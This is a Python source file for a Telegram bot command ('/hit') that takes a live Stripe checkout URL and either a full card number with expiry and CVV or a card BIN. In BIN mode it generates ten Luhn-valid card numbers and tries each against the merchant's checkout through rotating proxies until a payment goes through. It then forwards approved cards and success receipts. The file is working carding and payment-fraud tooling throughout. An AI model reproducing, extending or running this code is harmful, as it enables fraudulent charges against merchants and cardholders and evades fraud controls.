# Crafted With <3 By Bhaskar
import time
import asyncio
import re
from pyrogram import Client, filters
from FUNC.defs import log_cmd_error, forward_hit_resp
from FUNC.cc_gen import luhn_card_genarator
from FUNC.proxydb_func import get_random_user_proxy
from TOOLS.check_all_func import check_some_thing
from .response import get_hit_resp
from .gate import hit_gate
from .hitter_core import parse_checkout_url, retrieve_merchant_info

_CC_RE = re.compile(r'(\d{15,18})[\/\s:|-]*?(\d{1,2})[\/\s:|-]*?(\d{2,4})[\/\s:|-]*?(\d{3,4})')
_BIN_RE = re.compile(r'^(\d{6,16})$')


def _parse_cc(text):
    m = _CC_RE.search(text)
    return m.groups() if m else None


def _parse_bin(text):
    m = _BIN_RE.search(text.strip())
    return m.group(1) if m else None


@Client.on_message(filters.command("hit", [".", "/"]))
async def hit_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_some_thing(Client, message)

        cmd = "/hit"

        if checkall[0] == False:
            return

        parts = message.text.split()

        if len(parts) < 2:
            await message.reply_text(f"""<b>
Message: Provide a Stripe checkout URL ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
            return

        checkout_url = parts[1]

        if "checkout.stripe.com" not in checkout_url and "cs_live" not in checkout_url and "cs_test" not in checkout_url:
            await message.reply_text(
                f"<b>Message: Invalid Stripe checkout URL ❌</b>",
                message.id,
            )
            return

        raw_input = None
        if len(parts) >= 3:
            raw_input = parts[2]
        if not raw_input:
            try:
                raw_input = message.reply_to_message.text.strip()
            except Exception:
                pass

        if not raw_input:
            await message.reply_text(f"""<b>
Message: No CC or BIN Found ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
            return

        cc_tuple = _parse_cc(raw_input)
        bin_str = _parse_bin(raw_input) if not cc_tuple else None

        if not cc_tuple and not bin_str:
            await message.reply_text(f"""<b>
Message: Invalid CC or BIN format ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
            return

        # ── Fetch merchant info upfront (once) ──
        proxy = await get_random_user_proxy(user_id)
        merchant = "Unknown Merchant"
        price = "N/A"
        try:
            cs_live, pk_live = parse_checkout_url(checkout_url)
            minfo = await retrieve_merchant_info(cs_live, pk_live, proxy=proxy)
            if minfo.get("error"):
                await message.reply_text(
                    f"<b>Checkout Error: {minfo['error']} ❌</b>",
                    message.id,
                )
                return
            merchant = minfo.get("merchant") or merchant
            price = minfo.get("price") or price
            if merchant == "N/A":
                merchant = "Unknown Merchant"
        except ValueError as e:
            await message.reply_text(
                f"<b>URL Parse Error: {e} ❌</b>",
                message.id,
            )
            return
        except Exception:
            pass

        # ══════════════════════════════════════
        #  SINGLE CC MODE
        # ══════════════════════════════════════
        if cc_tuple:
            cc, mes, ano, cvv = cc_tuple
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"

            progress = await message.reply_text(f"""<b>
↯ Hitting...

𝗖𝗮𝗿𝗱- <code>{fullcc}</code>
𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ■■□□
</b>""", message.id)

            start = time.perf_counter()
            proxy = await get_random_user_proxy(user_id)
            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxy)
            getresp = await get_hit_resp(result, user_id, fullcc)
            status = getresp["status"]
            response = getresp["response"]
            receipt = getresp.get("receipt", "N/A")

            url_line = f'\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐔𝐑𝐋- <a href="{receipt}">Success URL</a>' if receipt and receipt != "N/A" and "✅" in status else ""

            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
{status}

𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾
𝗖𝗮𝗿𝗱- <code>{fullcc}</code>{url_line}

𝗧𝗶𝗺𝗲- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>""")

            if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" in status:
                await forward_hit_resp(fullcc, response, merchant, price, receipt)

            return

        # ══════════════════════════════════════
        #  BIN MODE — generate 10 Luhn cards
        # ══════════════════════════════════════
        progress = await message.reply_text(f"""<b>
↯ BIN Mode — Generating 10 cards

𝐁𝐈𝐍- <code>{bin_str}</code>
𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

⏳ Generating cards...
</b>""", message.id)

        cards_raw = await luhn_card_genarator(bin_str, "None", "None", "None", 10)
        cards = [c.strip() for c in cards_raw.strip().split("\n") if c.strip()]

        if not cards:
            await Client.edit_message_text(message.chat.id, progress.id,
                f"<b>Failed to generate cards from BIN {bin_str} ❌</b>")
            return

        start = time.perf_counter()
        checked = 0
        approved = 0
        declined = 0
        stopped_reason = None
        winner_cc = None
        winner_resp = None
        winner_receipt = None
        results_lines = []

        for card_str in cards:
            cc, mes, ano, cvv = card_str.split("|")
            fullcc = card_str
            checked += 1

            past = "\n".join(results_lines)
            if past:
                past += "\n"

            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
↯ Hitting {checked}/{len(cards)}

𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

{past}⏳ <code>{fullcc}</code>
</b>""")

            proxy = await get_random_user_proxy(user_id)
            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxy)
            getresp = await get_hit_resp(result, user_id, fullcc)
            status = getresp["status"]
            response = getresp["response"]

            if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" in status:
                approved += 1
                icon = "✅" if "✅" in status else "❎"
            else:
                declined += 1
                icon = "❌"

            results_lines.append(f"{icon} <code>{fullcc}</code> → {response}")

            if "✅" in status:
                winner_cc = fullcc
                winner_resp = response
                winner_receipt = getresp.get("receipt", "N/A")
                stopped_reason = "Payment Successful ✅"
                break

            resp_lower = response.lower()
            if "checkout_not_active_session" in resp_lower or "no longer active" in resp_lower:
                stopped_reason = "Session Expired ⚠️"
                break

        elapsed = time.perf_counter() - start
        all_results = "\n".join(results_lines)

        if winner_cc:
            url_line = f'\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐔𝐑𝐋- <a href="{winner_receipt}">Success URL</a>' if winner_receipt and winner_receipt != "N/A" else ""

            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
Hɪᴛ Sᴜᴄᴄᴇss ✅

𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{winner_resp}</i> ⤾
𝗖𝗮𝗿𝗱- <code>{winner_cc}</code>{url_line}

𝐂𝐡𝐞𝐜𝐤𝐞𝐝- {checked}/{len(cards)} | ✅ {approved} | ❌ {declined}
𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>""")

            await forward_hit_resp(winner_cc, winner_resp, merchant, price, winner_receipt, bin_str=bin_str)
        else:
            stop_line = f"\n𝐒𝐭𝐨𝐩𝐩𝐞𝐝- {stopped_reason}" if stopped_reason else ""
            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
𝐇𝐢𝐭 𝐒𝐮𝐦𝐦𝐚𝐫𝐲 — BIN: <code>{bin_str}</code>

𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

{all_results}

𝐂𝐡𝐞𝐜𝐤𝐞𝐝- {checked}/{len(cards)} | ✅ {approved} | ❌ {declined}{stop_line}
𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>""")

    except Exception:
        await log_cmd_error(message)
